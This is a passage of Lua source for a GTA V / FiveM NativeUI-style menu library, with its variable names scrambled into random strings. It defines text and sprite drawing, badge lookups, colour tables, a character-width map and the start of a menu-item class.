    SetTextFont(self.Font)
    SetTextScale(1.0, self.Scale)
    SetTextColour(self._Colour.R, self._Colour.G, self._Colour.B, self._Colour.A)
    if self.DropShadow then
        SetTextDropShadow()
    end
    if self.Outline then
        SetTextOutline()
    end
    if self.Alignment ~= nil then
        if self.Alignment == 1 or self.Alignment == "Center" or self.Alignment == "Centre" then
            SetTextCentre(true)
        elseif self.Alignment == 2 or self.Alignment == "Right" then
            SetTextRightJustify(true)
            SetTextWrap(0, gW22wBPsnv7pmdfMuPWbs.X)
        end
    end
    if tonumber(self.WordWrap) then
        if tonumber(self.WordWrap) ~= 0 then
            SetTextWrap(gW22wBPsnv7pmdfMuPWbs.X, gW22wBPsnv7pmdfMuPWbs.X + (tonumber(self.WordWrap) / Resolution.Width))
        end
    end
    BeginTextCommandDisplayText("STRING")
    AddLongString(self._Text)
    EndTextCommandDisplayText(gW22wBPsnv7pmdfMuPWbs.X, gW22wBPsnv7pmdfMuPWbs.Y)
end
Sprite = setmetatable({}, Sprite)
Sprite.__index = Sprite
Sprite.__call = function()
    return "Sprite"
end
function Sprite.New(
    p5hDWeHg,
    tfkFRPFxFgAe,
    vi1fShYt0if4PNe6,
    QpvOpEg,
    A0jK0PEIfwYWrN,
    ChHRATl4ab2f4dqgz,
    XyTqm9R4I7tikmBPm,
    eTSPF2wuV6k,
    iUgpK6L,
    K4D,
    r0ulpTaumeHEcY7h1h7s1)
    local YeYHdAHYgFaHURuI = {
        TxtDictionary = tostring(p5hDWeHg),
        TxtName = tostring(tfkFRPFxFgAe),
        X = tonumber(vi1fShYt0if4PNe6) or 0,
        Y = tonumber(QpvOpEg) or 0,
        Width = tonumber(A0jK0PEIfwYWrN) or 0,
        Height = tonumber(ChHRATl4ab2f4dqgz) or 0,
        Heading = tonumber(XyTqm9R4I7tikmBPm) or 0,
        _Colour = {
            R = tonumber(eTSPF2wuV6k) or 255,
            G = tonumber(iUgpK6L) or 255,
            B = tonumber(K4D) or 255,
            A = tonumber(r0ulpTaumeHEcY7h1h7s1) or 255
        }
    }
    return setmetatable(YeYHdAHYgFaHURuI, Sprite)
end
function Sprite:Position(nbh5w, msVlX0rbu96oVOOc)
    if tonumber(nbh5w) and tonumber(msVlX0rbu96oVOOc) then
        self.X = tonumber(nbh5w)
        self.Y = tonumber(msVlX0rbu96oVOOc)
    else
        return {X = self.X, Y = self.Y}
    end
end
function Sprite:Size(pL5, WUn_D_7Fez6)
    if tonumber(pL5) and tonumber(pL5) then
        self.Width = tonumber(pL5)
        self.Height = tonumber(WUn_D_7Fez6)
    else
        return {Width = self.Width, Height = self.Height}
    end
end
function Sprite:Colour(bTa2eU2KbxdkR, Cg1AfZ5Squ, dsAZ_RoVAJMAKKY, LCu6dwc_K7N2Fz)
    if tonumber(bTa2eU2KbxdkR) or tonumber(Cg1AfZ5Squ) or tonumber(dsAZ_RoVAJMAKKY) or tonumber(LCu6dwc_K7N2Fz) then
        self._Colour.R = tonumber(bTa2eU2KbxdkR) or 255
        self._Colour.B = tonumber(dsAZ_RoVAJMAKKY) or 255
        self._Colour.G = tonumber(Cg1AfZ5Squ) or 255
        self._Colour.A = tonumber(LCu6dwc_K7N2Fz) or 255
    else
        return self._Colour
    end
end
function Sprite:Draw()
    if not HasStreamedTextureDictLoaded(self.TxtDictionary) then
        RequestStreamedTextureDict(self.TxtDictionary, true)
    end
    local FTMaTHHHATSCAHjq = self:Position()
    local MC9ePZlgRfn = self:Size()
    MC9ePZlgRfn.Width, MC9ePZlgRfn.Height = FormatXWYH(MC9ePZlgRfn.Width, MC9ePZlgRfn.Height)
    FTMaTHHHATSCAHjq.X, FTMaTHHHATSCAHjq.Y = FormatXWYH(FTMaTHHHATSCAHjq.X, FTMaTHHHATSCAHjq.Y)
    DrawSprite(
        self.TxtDictionary,
        self.TxtName,
        FTMaTHHHATSCAHjq.X + MC9ePZlgRfn.Width * 0.5,
        FTMaTHHHATSCAHjq.Y + MC9ePZlgRfn.Height * 0.5,
        MC9ePZlgRfn.Width,
        MC9ePZlgRfn.Height,
        self.Heading,
        self._Colour.R,
        self._Colour.G,
        self._Colour.B,
        self._Colour.A
    )
end
BadgeStyle = {
    None = 0,
    BronzeMedal = 1,
    GoldMedal = 2,
    SilverMedal = 3,
    Alert = 4,
    Crown = 5,
    Ammo = 6,
    Armour = 7,
    Barber = 8,
    Clothes = 9,
    Franklin = 10,
    Bike = 11,
    Car = 12,
    Gun = 13,
    Heart = 14,
    Makeup = 15,
    Mask = 16,
    Michael = 17,
    Star = 18,
    Tattoo = 19,
    Trevor = 20,
    Lock = 21,
    Tick = 22,
    Unlock = 23,
    ArrowR = 24
}
BadgeTexture = {[0] = function()
        return ""
    end, [1] = function()
        return "mp_medal_bronze"
    end, [2] = function()
        return "mp_medal_gold"
    end, [3] = function()
        return "mp_medal_silver"
    end, [4] = function()
        return "mp_alerttriangle"
    end, [5] = function()
        return "mp_hostcrown"
    end, [6] = function(xi6jZXXy6xr0KXB)
        if xi6jZXXy6xr0KXB then
            return "shop_ammo_icon_b"
        else
            return "shop_ammo_icon_a"
        end
    end, [7] = function(y2ihPNIehEwp0jBx)
        if y2ihPNIehEwp0jBx then
            return "shop_armour_icon_b"
        else
            return "shop_armour_icon_a"
        end
    end, [8] = function(l)
        if l then
            return "shop_barber_icon_b"
        else
            return "shop_barber_icon_a"
        end
    end, [9] = function(PcknywHqMJerb0er)
        if PcknywHqMJerb0er then
            return "shop_clothing_icon_b"
        else
            return "shop_clothing_icon_a"
        end
    end, [10] = function(bUN5VQqrky)
        if bUN5VQqrky then
            return "shop_franklin_icon_b"
        else
            return "shop_franklin_icon_a"
        end
    end, [11] = function(DdmwUmZ)
        if DdmwUmZ then
            return "shop_garage_bike_icon_b"
        else
            return "shop_garage_bike_icon_a"
        end
    end, [12] = function(Anm)
        if Anm then
            return "shop_garage_icon_b"
        else
            return "shop_garage_icon_a"
        end
    end, [13] = function(UpF4F4PRSX9e9S)
        if UpF4F4PRSX9e9S then
            return "shop_gunclub_icon_b"
        else
            return "shop_gunclub_icon_a"
        end
    end, [14] = function(Q8q9nac66K)
        if Q8q9nac66K then
            return "shop_health_icon_b"
        else
            return "shop_health_icon_a"
        end
    end, [15] = function(v3gj8VhxD)
        if v3gj8VhxD then
            return "shop_makeup_icon_b"
        else
            return "shop_makeup_icon_a"
        end
    end, [16] = function(PvF4baeX6eFF)
        if PvF4baeX6eFF then
            return "shop_mask_icon_b"
        else
            return "shop_mask_icon_a"
        end
    end, [17] = function(F)
        if F then
            return "shop_michael_icon_b"
        else
            return "shop_michael_icon_a"
        end
    end, [18] = function()
        return "shop_new_star"
    end, [19] = function(wYovfiivwBQpd3V3)
        if wYovfiivwBQpd3V3 then
            return "shop_tattoos_icon_b"
        else
            return "shop_tattoos_icon_a"
        end
    end, [20] = function(OrGB1k1HJRG)
        if OrGB1k1HJRG then
            return "shop_trevor_icon_b"
        else
            return "shop_trevor_icon_a"
        end
    end, [21] = function()
        return "shop_lock"
    end, [22] = function()
        return "shop_tick_icon"
    end, [23] = function(IWk8_)
        if IWk8_ then
            return "lock_open_dark"
        else
            return "lock_open"
        end
    end, [24] = function(ABbI)
        if ABbI then
            return "arrowright"
        else
            return "arrowright"
        end
    end}
BadgeDictionary = {[0] = function(P2j6whYh5YqHfI9Nv)
        if P2j6whYh5YqHfI9Nv then
            return "commonmenu"
        else
            return "commonmenu"
        end
    end, [1] = function(eRrNRivrB)
        if eRrNRivrB then
            return "mpinventory"
        else
            return "mpinventory"
        end
    end, [2] = function(LjGCOmhvvxix1M)
        if LjGCOmhvvxix1M then
            return "mpsafecracking"
        else
            return "mpsafecracking"
        end
    end}
BadgeColour = {[5] = function(raQ3HxpeIF0bpds)
        if raQ3HxpeIF0bpds then
            return 0, 0, 0, 255
        else
            return 255, 255, 255, 255
        end
    end, [21] = function(HmHNm6YcSlzqMjdVqGpNq)
        if HmHNm6YcSlzqMjdVqGpNq then
            return 0, 0, 0, 255
        else
            return 255, 255, 255, 255
        end
    end, [22] = function(DfFD_6)
        if DfFD_6 then
            return 0, 0, 0, 255
        else
            return 255, 255, 255, 255
        end
    end}
function GetBadgeTexture(aXfEQkDO6f, DpcwxOVngxuk5fd)
    if BadgeTexture[aXfEQkDO6f] then
        return BadgeTexture[aXfEQkDO6f](DpcwxOVngxuk5fd)
    else
        return ""
    end
end
function GetBadgeDictionary(E0eDqGBcWISKs, I1JDdCxd0wEoGhp)
    if BadgeDictionary[E0eDqGBcWISKs] then
        return BadgeDictionary[E0eDqGBcWISKs](I1JDdCxd0wEoGhp)
    else
        return "commonmenu"
    end
end
function GetBadgeColour(kP, a0BJV9Nb_FHn5y4Sa95X)
    if BadgeColour[kP] then
        return BadgeColour[kP](a0BJV9Nb_FHn5y4Sa95X)
    else
        return 255, 255, 255, 255
    end
end
Colours = {
    DefaultColors = {R = 0, G = 0, B = 0, A = 0},
    PureWhite = {R = 255, G = 255, B = 255, A = 255},
    White = {R = 240, G = 240, B = 240, A = 255},
    Black = {R = 0, G = 0, B = 0, A = 255},
    Grey = {R = 155, G = 155, B = 155, A = 255},
    GreyLight = {R = 205, G = 205, B = 205, A = 255},
    GreyDark = {R = 77, G = 77, B = 77, A = 255},
    Red = {R = 224, G = 50, B = 50, A = 255},
    RedLight = {R = 240, G = 153, B = 153, A = 255},
    RedDark = {R = 112, G = 25, B = 25, A = 255},
    Blue = {R = 93, G = 182, B = 229, A = 255},
    BlueLight = {R = 174, G = 219, B = 242, A = 255},
    BlueDark = {R = 47, G = 92, B = 115, A = 255},
    Yellow = {R = 240, G = 200, B = 80, A = 255},
    YellowLight = {R = 254, G = 235, B = 169, A = 255},
    YellowDark = {R = 126, G = 107, B = 41, A = 255},
    Orange = {R = 255, G = 133, B = 85, A = 255},
    OrangeLight = {R = 255, G = 194, B = 170, A = 255},
    OrangeDark = {R = 127, G = 66, B = 42, A = 255},
    Green = {R = 114, G = 204, B = 114, A = 255},
    GreenLight = {R = 185, G = 230, B = 185, A = 255},
    GreenDark = {R = 57, G = 102, B = 57, A = 255},
    Purple = {R = 132, G = 102, B = 226, A = 255},
    PurpleLight = {R = 192, G = 179, B = 239, A = 255},
    PurpleDark = {R = 67, G = 57, B = 111, A = 255},
    Pink = {R = 203, G = 54, B = 148, A = 255},
    RadarHealth = {R = 53, G = 154, B = 71, A = 255},
    RadarArmour = {R = 93, G = 182, B = 229, A = 255},
    RadarDamage = {R = 235, G = 36, B = 39, A = 255},
    NetPlayer1 = {R = 194, G = 80, B = 80, A = 255},
    NetPlayer2 = {R = 156, G = 110, B = 175, A = 255},
    NetPlayer3 = {R = 255, G = 123, B = 196, A = 255},
    NetPlayer4 = {R = 247, G = 159, B = 123, A = 255},
    NetPlayer5 = {R = 178, G = 144, B = 132, A = 255},
    NetPlayer6 = {R = 141, G = 206, B = 167, A = 255},
    NetPlayer7 = {R = 113, G = 169, B = 175, A = 255},
    NetPlayer8 = {R = 211, G = 209, B = 231, A = 255},
    NetPlayer9 = {R = 144, G = 127, B = 153, A = 255},
    NetPlayer10 = {R = 106, G = 196, B = 191, A = 255},
    NetPlayer11 = {R = 214, G = 196, B = 153, A = 255},
    NetPlayer12 = {R = 234, G = 142, B = 80, A = 255},
    NetPlayer13 = {R = 152, G = 203, B = 234, A = 255},
    NetPlayer14 = {R = 178, G = 98, B = 135, A = 255},
    NetPlayer15 = {R = 144, G = 142, B = 122, A = 255},
    NetPlayer16 = {R = 166, G = 117, B = 94, A = 255},
    NetPlayer17 = {R = 175, G = 168, B = 168, A = 255},
    NetPlayer18 = {R = 232, G = 142, B = 155, A = 255},
    NetPlayer19 = {R = 187, G = 214, B = 91, A = 255},
    NetPlayer20 = {R = 12, G = 123, B = 86, A = 255},
    NetPlayer21 = {R = 123, G = 196, B = 255, A = 255},
    NetPlayer22 = {R = 171, G = 60, B = 230, A = 255},
    NetPlayer23 = {R = 206, G = 169, B = 13, A = 255},
    NetPlayer24 = {R = 71, G = 99, B = 173, A = 255},
    NetPlayer25 = {R = 42, G = 166, B = 185, A = 255},
    NetPlayer26 = {R = 186, G = 157, B = 125, A = 255},
    NetPlayer27 = {R = 201, G = 225, B = 255, A = 255},
    NetPlayer28 = {R = 240, G = 240, B = 150, A = 255},
    NetPlayer29 = {R = 237, G = 140, B = 161, A = 255},
    NetPlayer30 = {R = 249, G = 138, B = 138, A = 255},
    NetPlayer31 = {R = 252, G = 239, B = 166, A = 255},
    NetPlayer32 = {R = 240, G = 240, B = 240, A = 255},
    SimpleBlipDefault = {R = 159, G = 201, B = 166, A = 255},
    MenuBlue = {R = 140, G = 140, B = 140, A = 255},
    MenuGreyLight = {R = 140, G = 140, B = 140, A = 255},
    MenuBlueExtraDark = {R = 40, G = 40, B = 40, A = 255},
    MenuYellow = {R = 240, G = 160, B = 0, A = 255},
    MenuYellowDark = {R = 240, G = 160, B = 0, A = 255},
    MenuGreen = {R = 240, G = 160, B = 0, A = 255},
    MenuGrey = {R = 140, G = 140, B = 140, A = 255},
    MenuGreyDark = {R = 60, G = 60, B = 60, A = 255},
    MenuHighlight = {R = 30, G = 30, B = 30, A = 255},
    MenuStandard = {R = 140, G = 140, B = 140, A = 255},
    MenuDimmed = {R = 75, G = 75, B = 75, A = 255},
    MenuExtraDimmed = {R = 50, G = 50, B = 50, A = 255},
    BriefTitle = {R = 95, G = 95, B = 95, A = 255},
    MidGreyMp = {R = 100, G = 100, B = 100, A = 255},
    NetPlayer1Dark = {R = 93, G = 39, B = 39, A = 255},
    NetPlayer2Dark = {R = 77, G = 55, B = 89, A = 255},
    NetPlayer3Dark = {R = 124, G = 62, B = 99, A = 255},
    NetPlayer4Dark = {R = 120, G = 80, B = 80, A = 255},
    NetPlayer5Dark = {R = 87, G = 72, B = 66, A = 255},
    NetPlayer6Dark = {R = 74, G = 103, B = 83, A = 255},
    NetPlayer7Dark = {R = 60, G = 85, B = 88, A = 255},
    NetPlayer8Dark = {R = 105, G = 105, B = 64, A = 255},
    NetPlayer9Dark = {R = 72, G = 63, B = 76, A = 255},
    NetPlayer10Dark = {R = 53, G = 98, B = 95, A = 255},
    NetPlayer11Dark = {R = 107, G = 98, B = 76, A = 255},
    NetPlayer12Dark = {R = 117, G = 71, B = 40, A = 255},
    NetPlayer13Dark = {R = 76, G = 101, B = 117, A = 255},
    NetPlayer14Dark = {R = 65, G = 35, B = 47, A = 255},
    NetPlayer15Dark = {R = 72, G = 71, B = 61, A = 255},
    NetPlayer16Dark = {R = 85, G = 58, B = 47, A = 255},
    NetPlayer17Dark = {R = 87, G = 84, B = 84, A = 255},
    NetPlayer18Dark = {R = 116, G = 71, B = 77, A = 255},
    NetPlayer19Dark = {R = 93, G = 107, B = 45, A = 255},
    NetPlayer20Dark = {R = 6, G = 61, B = 43, A = 255},
    NetPlayer21Dark = {R = 61, G = 98, B = 127, A = 255},
    NetPlayer22Dark = {R = 85, G = 30, B = 115, A = 255},
    NetPlayer23Dark = {R = 103, G = 84, B = 6, A = 255},
    NetPlayer24Dark = {R = 35, G = 49, B = 86, A = 255},
    NetPlayer25Dark = {R = 21, G = 83, B = 92, A = 255},
    NetPlayer26Dark = {R = 93, G = 98, B = 62, A = 255},
    NetPlayer27Dark = {R = 100, G = 112, B = 127, A = 255},
    NetPlayer28Dark = {R = 120, G = 120, B = 75, A = 255},
    NetPlayer29Dark = {R = 152, G = 76, B = 93, A = 255},
    NetPlayer30Dark = {R = 124, G = 69, B = 69, A = 255},
    NetPlayer31Dark = {R = 10, G = 43, B = 50, A = 255},
    NetPlayer32Dark = {R = 95, G = 95, B = 10, A = 255},
    Bronze = {R = 180, G = 130, B = 97, A = 255},
    Silver = {R = 150, G = 153, B = 161, A = 255},
    Gold = {R = 214, G = 181, B = 99, A = 255},
    Platinum = {R = 166, G = 221, B = 190, A = 255},
    Gang1 = {R = 29, G = 100, B = 153, A = 255},
    Gang2 = {R = 214, G = 116, B = 15, A = 255},
    Gang3 = {R = 135, G = 125, B = 142, A = 255},
    Gang4 = {R = 229, G = 119, B = 185, A = 255},
    SameCrew = {R = 252, G = 239, B = 166, A = 255},
    Freemode = {R = 45, G = 110, B = 185, A = 255},
    PauseBg = {R = 0, G = 0, B = 0, A = 255},
    Friendly = {R = 93, G = 182, B = 229, A = 255},
    Enemy = {R = 194, G = 80, B = 80, A = 255},
    Location = {R = 240, G = 200, B = 80, A = 255},
    Pickup = {R = 114, G = 204, B = 114, A = 255},
    PauseSingleplayer = {R = 114, G = 204, B = 114, A = 255},
    FreemodeDark = {R = 22, G = 55, B = 92, A = 255},
    InactiveMission = {R = 154, G = 154, B = 154, A = 255},
    Damage = {R = 194, G = 80, B = 80, A = 255},
    PinkLight = {R = 252, G = 115, B = 201, A = 255},
    PmMitemHighlight = {R = 252, G = 177, B = 49, A = 255},
    ScriptVariable = {R = 0, G = 0, B = 0, A = 255},
    Yoga = {R = 109, G = 247, B = 204, A = 255},
    Tennis = {R = 241, G = 101, B = 34, A = 255},
    Golf = {R = 214, G = 189, B = 97, A = 255},
    ShootingRange = {R = 112, G = 25, B = 25, A = 255},
    FlightSchool = {R = 47, G = 92, B = 115, A = 255},
    NorthBlue = {R = 93, G = 182, B = 229, A = 255},
    SocialClub = {R = 234, G = 153, B = 28, A = 255},
    PlatformBlue = {R = 11, G = 55, B = 123, A = 255},
    PlatformGreen = {R = 146, G = 200, B = 62, A = 255},
    PlatformGrey = {R = 234, G = 153, B = 28, A = 255},
    FacebookBlue = {R = 66, G = 89, B = 148, A = 255},
    IngameBg = {R = 0, G = 0, B = 0, A = 255},
    Darts = {R = 114, G = 204, B = 114, A = 255},
    Waypoint = {R = 164, G = 76, B = 242, A = 255},
    Michael = {R = 101, G = 180, B = 212, A = 255},
    Franklin = {R = 171, G = 237, B = 171, A = 255},
    Trevor = {R = 255, G = 163, B = 87, A = 255},
    GolfP1 = {R = 240, G = 240, B = 240, A = 255},
    GolfP2 = {R = 235, G = 239, B = 30, A = 255},
    GolfP3 = {R = 255, G = 149, B = 14, A = 255},
    GolfP4 = {R = 246, G = 60, B = 161, A = 255},
    WaypointLight = {R = 210, G = 166, B = 249, A = 255},
    WaypointDark = {R = 82, G = 38, B = 121, A = 255},
    PanelLight = {R = 0, G = 0, B = 0, A = 255},
    MichaelDark = {R = 72, G = 103, B = 116, A = 255},
    FranklinDark = {R = 85, G = 118, B = 85, A = 255},
    TrevorDark = {R = 127, G = 81, B = 43, A = 255},
    ObjectiveRoute = {R = 240, G = 200, B = 80, A = 255},
    PausemapTint = {R = 0, G = 0, B = 0, A = 255},
    PauseDeselect = {R = 100, G = 100, B = 100, A = 255},
    PmWeaponsPurchasable = {R = 45, G = 110, B = 185, A = 255},
    PmWeaponsLocked = {R = 240, G = 240, B = 240, A = 255},
    EndScreenBg = {R = 0, G = 0, B = 0, A = 255},
    Chop = {R = 224, G = 50, B = 50, A = 255},
    PausemapTintHalf = {R = 0, G = 0, B = 0, A = 255},
    NorthBlueOfficial = {R = 0, G = 71, B = 133, A = 255},
    ScriptVariable2 = {R = 0, G = 0, B = 0, A = 255},
    H = {R = 33, G = 118, B = 37, A = 255},
    HDark = {R = 37, G = 102, B = 40, A = 255},
    T = {R = 234, G = 153, B = 28, A = 255},
    TDark = {R = 225, G = 140, B = 8, A = 255},
    HShard = {R = 20, G = 40, B = 0, A = 255},
    ControllerMichael = {R = 48, G = 255, B = 255, A = 255},
    ControllerFranklin = {R = 48, G = 255, B = 0, A = 255},
    ControllerTrevor = {R = 176, G = 80, B = 0, A = 255},
    ControllerChop = {R = 127, G = 0, B = 0, A = 255},
    VideoEditorVideo = {R = 53, G = 166, B = 224, A = 255},
    VideoEditorAudio = {R = 162, G = 79, B = 157, A = 255},
    VideoEditorText = {R = 104, G = 192, B = 141, A = 255},
    HbBlue = {R = 29, G = 100, B = 153, A = 255},
    HbYellow = {R = 234, G = 153, B = 28, A = 255},
    VideoEditorScore = {R = 240, G = 160, B = 1, A = 255},
    VideoEditorAudioFadeout = {R = 59, G = 34, B = 57, A = 255},
    VideoEditorTextFadeout = {R = 41, G = 68, B = 53, A = 255},
    VideoEditorScoreFadeout = {R = 82, G = 58, B = 10, A = 255},
    HeistBackground = {R = 37, G = 102, B = 40, A = 255},
    VideoEditorAmbient = {R = 240, G = 200, B = 80, A = 255},
    VideoEditorAmbientFadeout = {R = 80, G = 70, B = 34, A = 255},
    Gb = {R = 255, G = 133, B = 85, A = 255},
    G = {R = 255, G = 194, B = 170, A = 255},
    B = {R = 255, G = 133, B = 85, A = 255},
    LowFlow = {R = 240, G = 200, B = 80, A = 255},
    LowFlowDark = {R = 126, G = 107, B = 41, A = 255},
    G1 = {R = 247, G = 159, B = 123, A = 255},
    G2 = {R = 226, G = 134, B = 187, A = 255},
    G3 = {R = 239, G = 238, B = 151, A = 255},
    G4 = {R = 113, G = 169, B = 175, A = 255},
    G5 = {R = 160, G = 140, B = 193, A = 255},
    G6 = {R = 141, G = 206, B = 167, A = 255},
    G7 = {R = 181, G = 214, B = 234, A = 255},
    G8 = {R = 178, G = 144, B = 132, A = 255},
    G9 = {R = 0, G = 132, B = 114, A = 255},
    G10 = {R = 216, G = 85, B = 117, A = 255},
    G11 = {R = 30, G = 100, B = 152, A = 255},
    G12 = {R = 43, G = 181, B = 117, A = 255},
    G13 = {R = 233, G = 141, B = 79, A = 255},
    G14 = {R = 137, G = 210, B = 215, A = 255},
    G15 = {R = 134, G = 125, B = 141, A = 255},
    Adversary = {R = 109, G = 34, B = 33, A = 255},
    DegenRed = {R = 255, G = 0, B = 0, A = 255},
    DegenYellow = {R = 255, G = 255, B = 0, A = 255},
    DegenGreen = {R = 0, G = 255, B = 0, A = 255},
    DegenCyan = {R = 0, G = 255, B = 255, A = 255},
    DegenBlue = {R = 0, G = 0, B = 255, A = 255},
    DegenMagenta = {R = 255, G = 0, B = 255, A = 255},
    Stunt1 = {R = 38, G = 136, B = 234, A = 255},
    Stunt2 = {R = 224, G = 50, B = 50, A = 255}
}
ColoursPanel = {}
ColoursPanel.HairCut = {
    {22, 19, 19},
    {30, 28, 25},
    {76, 56, 45},
    {69, 34, 24},
    {123, 59, 31},
    {149, 68, 35},
    {165, 87, 50},
    {175, 111, 72},
    {159, 105, 68},
    {198, 152, 108},
    {213, 170, 115},
    {223, 187, 132},
    {202, 164, 110},
    {238, 204, 130},
    {229, 190, 126},
    {250, 225, 167},
    {187, 140, 96},
    {163, 92, 60},
    {144, 52, 37},
    {134, 21, 17},
    {164, 24, 18},
    {195, 33, 24},
    {221, 69, 34},
    {229, 71, 30},
    {208, 97, 56},
    {113, 79, 38},
    {132, 107, 95},
    {185, 164, 150},
    {218, 196, 180},
    {247, 230, 217},
    {102, 72, 93},
    {162, 105, 138},
    {171, 174, 11},
    {239, 61, 200},
    {255, 69, 152},
    {255, 178, 191},
    {12, 168, 146},
    {8, 146, 165},
    {11, 82, 134},
    {118, 190, 117},
    {52, 156, 104},
    {22, 86, 85},
    {152, 177, 40},
    {127, 162, 23},
    {241, 200, 98},
    {238, 178, 16},
    {224, 134, 14},
    {247, 157, 15},
    {243, 143, 16},
    {231, 70, 15},
    {255, 101, 21},
    {254, 91, 34},
    {252, 67, 21},
    {196, 12, 15},
    {143, 10, 14},
    {44, 27, 22},
    {80, 51, 37},
    {98, 54, 37},
    {60, 31, 24},
    {69, 43, 32},
    {8, 10, 14},
    {212, 185, 158},
    {212, 185, 158},
    {213, 170, 115}
}
CharacterMap = {
    [" "] = 6,
    ["!"] = 6,
    ['"'] = 6,
    ["#"] = 11,
    ["$"] = 10,
    ["%"] = 17,
    ["&"] = 13,
    ["\\"] = 4,
    ["("] = 6,
    [")"] = 6,
    ["*"] = 7,
    ["+"] = 10,
    [","] = 4,
    ["-"] = 6,
    ["."] = 4,
    ["/"] = 7,
    ["0"] = 12,
    ["1"] = 7,
    ["2"] = 11,
    ["3"] = 11,
    ["4"] = 11,
    ["5"] = 11,
    ["6"] = 12,
    ["7"] = 10,
    ["8"] = 11,
    ["9"] = 11,
    [":"] = 5,
    [";"] = 4,
    ["<"] = 9,
    ["="] = 9,
    [">"] = 9,
    ["?"] = 10,
    ["@"] = 15,
    ["A"] = 12,
    ["B"] = 13,
    ["C"] = 14,
    ["D"] = 14,
    ["E"] = 12,
    ["F"] = 12,
    ["G"] = 15,
    ["H"] = 14,
    ["I"] = 5,
    ["J"] = 11,
    ["K"] = 13,
    ["L"] = 11,
    ["M"] = 16,
    ["N"] = 14,
    ["O"] = 16,
    ["P"] = 12,
    ["Q"] = 15,
    ["R"] = 13,
    ["S"] = 12,
    ["T"] = 11,
    ["U"] = 13,
    ["V"] = 12,
    ["W"] = 18,
    ["X"] = 11,
    ["Y"] = 11,
    ["Z"] = 12,
    ["["] = 6,
    ["]"] = 6,
    ["^"] = 9,
    ["_"] = 18,
    ["`"] = 8,
    ["a"] = 11,
    ["b"] = 12,
    ["c"] = 11,
    ["d"] = 12,
    ["e"] = 12,
    ["f"] = 5,
    ["g"] = 13,
    ["h"] = 11,
    ["i"] = 4,
    ["j"] = 4,
    ["k"] = 10,
    ["l"] = 4,
    ["m"] = 18,
    ["n"] = 11,
    ["o"] = 12,
    ["p"] = 12,
    ["q"] = 12,
    ["r"] = 7,
    ["s"] = 9,
    ["t"] = 5,
    ["u"] = 11,
    ["v"] = 10,
    ["w"] = 14,
    ["x"] = 9,
    ["y"] = 10,
    ["z"] = 9,
    ["{"] = 6,
    ["|"] = 3,
    ["}"] = 6
}
function MeasureString(jCdzxgIL)
    local zWLGGr = 0
    for i = 1, GetCharacterCount(jCdzxgIL), 1 do
        if CharacterMap[string.sub(jCdzxgIL, i, i)] then
            zWLGGr = zWLGGr + CharacterMap[string.sub(jCdzxgIL, i, i)] + 1
        end
    end
    return zWLGGr
end
UIMenuItem = setmetatable({}, UIMenuItem)
UIMenuItem.__index = UIMenuItem
UIMenuItem.__call = function()
    return "UIMenuItem", "UIMenuItem"
end
function UIMenuItem.New(NljomsmpFDAm8XTHT0U, jKfoXkxnjUyJYTsafex)
    local qeV9 = {
        Rectangle = UIResRectangle.New(0, 0, 431, 38, 255, 255, 255, 20),
        Text = UIResText.New(tostring(NljomsmpFDAm8XTHT0U) or "", 8, 0, 0.33, 245, 245, 245, 255, 0),
        _Text = {
            Padding = {X = 8},
            Colour = {Selected = {R = 0, G = 0, B = 0, A = 255}, Hovered = {R = 245, G = 245, B = 245, A = 255}}
        },
        _Description = tostring(jKfoXkxnjUyJYTsafex) or "",
        SelectedSprite = Sprite.New("commonmenu", "gradient_nav", 0, 0, 431, 38),
        LeftBadge = {Sprite = Sprite.New("commonmenu", "", 0, 0, 40, 40), Badge = 0},
        RightBadge = {Sprite = Sprite.New("commonmenu", "", 0, 0, 40, 40), Badge = 0},
        Label = {
            Text = UIResText.New("", 0, 0, 0.35, 245, 245, 245, 255, 0, "Right"),
            MainColour = {R = 255, G = 255, B = 255, A = 255},
            HighlightColour = {R = 0, G = 0, B = 0, A = 255}
        },
        _Selected = false,
        _Hovered = false,
        _Enabled = true,
        _Offset = {X = 0, Y = 0},
        ParentMenu = nil,
        Panels = {},
        Activated = function(Jvbb2CirjC, xBD)
        end,
        ActivatedPanel = function(plfWMCI1, emUs, q62XDPOl1PcjIdPhYdB, Ayv2snFzyL)
        end
    }
    return setmetatable(qeV9, UIMenuItem)
end
function UIMenuItem:SetParentMenu(PObuu9d)
    if PObuu9d ~= nil and PObuu9d() == "UIMenu" then
        self.ParentMenu = PObuu9d
    else
        return self.ParentMenu
    end
end
function UIMenuItem:Selected(JmH9gT9iQsJlyhgjoQ)
    if JmH9gT9iQsJlyhgjoQ ~= nil then
        self._Selected = tobool(JmH9gT9iQsJlyhgjoQ)
    else
        return self._Selected
    end
end
function UIMenuItem:Hovered(RQyDkGKXSeW)
    if RQyDkGKXSeW ~= nil then
        self._Hovered = tobool(RQyDkGKXSeW)
    else
        return self._Hovered
    end
end
function UIMenuItem:Enabled(c)
    if c ~= nil then
        self._Enabled = tobool(c)
    else
        return self._Enabled
    end
end
function UIMenuItem:Description(lOeEp8)
    if tostring(lOeEp8) and lOeEp8 ~= nil then
        self._Description = tostring(lOeEp8)
    else
        return self._Description
    end
end
function UIMenuItem:Offset(EWi42Ji6fqcGx, sB)
    if tonumber(EWi42Ji6fqcGx) or tonumber(sB) then
        if tonumber(EWi42Ji6fqcGx) then
            self._Offset.X = tonumber(EWi42Ji6fqcGx)
        end
        if tonumber(sB) then
            self._Offset.Y = tonumber(sB)
        end
    else
        return self._Offset
    end
end
function UIMenuItem:Position(D1yueuf3vp8G8628HCldM)
    if tonumber(D1yueuf3vp8G8628HCldM) then
        self.Rectangle:Position(self._Offset.X, D1yueuf3vp8G8628HCldM + 144 + self._Offset.Y)
        self.SelectedSprite:Position(0 + self._Offset.X, D1yueuf3vp8G8628HCldM + 144 + self._Offset.Y)
        self.Text:Position(self._Text.Padding.X + self._Offset.X, D1yueuf3vp8G8628HCldM + 147 + self._Offset.Y)
        self.LeftBadge.Sprite:Position(0 + self._Offset.X, D1yueuf3vp8G8628HCldM + 142 + self._Offset.Y)
        self.RightBadge.Sprite:Position(385 + self._Offset.X, D1yueuf3vp8G8628HCldM + 142 + self._Offset.Y)
        self.Label.Text:Position(420 + self._Offset.X, D1yueuf3vp8G8628HCldM + 148 + self._Offset.Y)
    end
end
function UIMenuItem:RightLabel(FYdHlxHc5zby47SkgJv, p0e9dYm43ydk, XKeI_BTqJoAmTRo7awA_)
    if p0e9dYm43ydk ~= nil then
        labelMainColour = p0e9dYm43ydk
    else
        labelMainColour = {R = 255, G = 255, B = 255, A = 255}
    end
    if XKeI_BTqJoAmTRo7awA_ ~= nil then
        labelHighlightColour = XKeI_BTqJoAmTRo7awA_
    else
